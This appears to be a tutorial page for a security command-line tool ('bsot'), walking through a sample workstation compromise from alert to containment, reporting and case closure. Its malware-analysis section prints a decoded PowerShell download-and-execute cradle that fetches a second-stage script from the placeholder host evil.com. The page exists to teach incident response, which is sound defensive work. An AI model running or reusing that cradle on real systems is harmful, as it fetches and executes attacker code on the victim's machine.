# Incident Response

From detection to containment to documentation.

---

## Scenario

An alert fires indicating potential compromise of a workstation. The security team needs to investigate, contain the threat, and document findings.

---

## Phase 1: Initial Response

### Create Investigation Case

```bash
bsot case new compromised-workstation-ws42 \
  --type intrusion \
  --severity critical \
  --analyst "Jane Doe"
```

### Document Initial Alert

```bash
bsot case timeline "EDR alert: Suspicious PowerShell activity on WS42" \
  --time "2025-01-15 14:30:00"

bsot case note "Alert from CrowdStrike: Encoded PowerShell execution detected"
```

---

## Phase 2: Evidence Collection

### Collect Artifacts from System

```bash
# Full artifact collection
bsot ir collect --profile full -o ./evidence/ws42
```

??? example "Sample Output"
    ```
    ══════════════════════════════════════════════════════════
      Forensic Artifact Collection
    ══════════════════════════════════════════════════════════
      Profile: full
      Hostname: WS42
    
      Collecting artifacts...
    
      ✓ Collection complete
    
      Output directory: ./evidence/ws42
      Files collected: 47
      Total size: 2.3 MB
    
    ── Artifacts Collected ───────────────────────────────────
      • system/processes
      • system/connections
      • system/users
      • system/scheduled_tasks
      • system/startup_items
      • system/installed_software
      • logs/security
      • logs/system
      • logs/powershell
    ```

### Create Evidence Manifest

```bash
bsot ir hash-tree ./evidence/ws42 -o evidence_manifest.json
```

### Add Evidence to Case

```bash
bsot case add ./evidence/ws42/logs/powershell.log --type log
```

---

## Phase 3: Log Analysis

### Analyze Authentication Logs

```bash
bsot logs analyze -f ./evidence/ws42/logs/security.log
```

??? example "Sample Output"
    ```
    ══════════════════════════════════════════════════════════
      Log Analysis Results
    ══════════════════════════════════════════════════════════
    
    ── Findings (2) ──────────────────────────────────────────
    
      [HIGH] Suspicious Login Pattern
        User: admin
        MITRE: T1078 - Valid Accounts
        Multiple failed logins followed by success from new IP
        Events: 15
    
      [MEDIUM] Off-Hours Activity
        User: admin
        Time: 02:15:00 UTC
        Activity during non-business hours
    ```

### Analyze PowerShell Logs

```bash
bsot logs analyze -f ./evidence/ws42/logs/powershell.log
```

---

## Phase 4: Malware Analysis

### Decode Suspicious Script

```bash
bsot malware deobfuscate encoded_script.ps1
```

??? example "Sample Output"
    ```
    Detected: PowerShell -EncodedCommand
    
    Layer 1 (base64):
       IEX(New-Object Net.WebClient).DownloadString('http://evil.com/stage2.ps1')
    
    🔍 Extracted IOCs
       urls: http://evil.com/stage2.ps1
    ```

### Extract IOCs from Script

```bash
bsot malware ioc decoded_script.ps1 --format json -o script_iocs.json
```

---

## Phase 5: Threat Intelligence

### Enrich Discovered IOCs

```bash
# Enrich C2 domain
bsot intel enrich evil.com

# Bulk enrich all IOCs
bsot intel bulk -f all_iocs.txt --json -o enriched_iocs.json
```

### Check WHOIS

```bash
bsot intel whois evil.com
```

---

## Phase 6: Containment

### Block Attacker IP at Cloudflare

```bash
bsot ir cf block 203.0.113.50 --note "C2 server from WS42 incident"
```

### Generate Local Containment Commands

```bash
bsot ir contain --block-ip 203.0.113.50 --platform windows
bsot ir contain --disable-user compromised_admin --platform windows
```

### Document Containment Actions

```bash
bsot case timeline "Blocked C2 IP 203.0.113.50 at Cloudflare"
bsot case timeline "Disabled compromised admin account"
bsot case timeline "Isolated workstation WS42 from network"
```

---

## Phase 7: Investigation Notes

```bash
bsot case note "Attack vector: Phishing email with malicious attachment"
bsot case note "Initial access: 2025-01-15 02:15 UTC via RDP"
bsot case note "Lateral movement: Attempted access to file server FS01"
bsot case note "C2 communication: evil.com (203.0.113.50)"
bsot case note "Data exfiltration: No evidence of data theft"
```

---

## Phase 8: Reporting

### Generate Executive Report

```bash
bsot report generate --template executive -o reports/executive_summary.md
```

### Generate Technical Report

```bash
bsot report generate --template technical -o reports/technical_report.md
```

### Export IOCs

```bash
# For SIEM/SOAR
bsot report ioc --format stix -o reports/iocs.stix.json

# For blocklists
bsot report ioc --format csv -o reports/blocklist.csv
```

### Export Timeline

```bash
bsot report timeline --format markdown -o reports/timeline.md
```

---

## Phase 9: Case Closure

### Package Case

```bash
bsot report package --encrypt -o cases/ws42_incident_2025-01-15.zip
```

### Close Case

```bash
bsot case close
```

---

## Complete Timeline

| Time | Event |
|------|-------|
| 02:15 | Attacker gains RDP access using stolen credentials |
| 02:17 | PowerShell executes encoded command |
| 02:18 | Stage 2 payload downloaded from C2 |
| 02:20 | Attempt to access file server FS01 (failed) |
| 14:30 | EDR alert triggered |
| 14:35 | Investigation started |
| 14:45 | Artifacts collected |
| 15:00 | C2 identified and blocked |
| 15:15 | User account disabled, system isolated |
| 16:00 | Analysis complete |
| 17:00 | Reports generated |

---

## IOCs Discovered

| Type | Value | Context |
|------|-------|---------|
| IP | 203.0.113.50 | C2 server |
| Domain | evil.com | C2 domain |
| URL | http://evil.com/stage2.ps1 | Payload URL |
| Hash | abc123... | Malicious script |

---

## Lessons Learned

1. **MFA** would have prevented the initial RDP access
2. **PowerShell logging** was critical for detection
3. **Network segmentation** blocked lateral movement
4. **Rapid response** prevented data exfiltration

